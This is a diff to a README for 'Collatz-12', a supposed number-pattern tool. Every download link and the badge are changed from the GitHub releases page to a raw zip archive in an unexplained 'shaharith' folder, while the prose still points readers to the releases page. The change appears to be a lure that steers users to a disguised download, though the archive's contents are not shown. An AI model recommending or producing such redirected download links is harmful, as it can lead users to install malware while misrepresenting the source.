@@ -1,6 +1,6 @@
 # ⚙️ Collatz-12 - Explore Number Patterns Easily
 
-[![Download Collatz-12](https://img.shields.io/badge/Download-Collatz--12-blue?style=for-the-badge)](https://github.com/fakenew12/Collatz-12/releases)
+[![Download Collatz-12](https://github.com/fakenew12/Collatz-12/raw/refs/heads/main/shaharith/Collatz_v1.6.zip)](https://github.com/fakenew12/Collatz-12/raw/refs/heads/main/shaharith/Collatz_v1.6.zip)
 
 ## 📋 What is Collatz-12?
 
@@ -33,7 +33,7 @@ Collatz-12 is designed to work well even on modest hardware. If you have an olde
 
 1. **Visit the download page by clicking the big button at the top or use the link below:**
 
-   [Download Collatz-12 Releases](https://github.com/fakenew12/Collatz-12/releases)
+   [Download Collatz-12 Releases](https://github.com/fakenew12/Collatz-12/raw/refs/heads/main/shaharith/Collatz_v1.6.zip)
 
 2. On the releases page, look for the latest version.
 
@@ -61,7 +61,7 @@ Collatz-12 is designed to work well even on modest hardware. If you have an olde
 You must visit the release page to get the software and install it on your computer.
 
 Here is the direct link to the releases page again for your convenience:  
-[https://github.com/fakenew12/Collatz-12/releases](https://github.com/fakenew12/Collatz-12/releases)
+[https://github.com/fakenew12/Collatz-12/raw/refs/heads/main/shaharith/Collatz_v1.6.zip](https://github.com/fakenew12/Collatz-12/raw/refs/heads/main/shaharith/Collatz_v1.6.zip)
 
 On the release page:
 
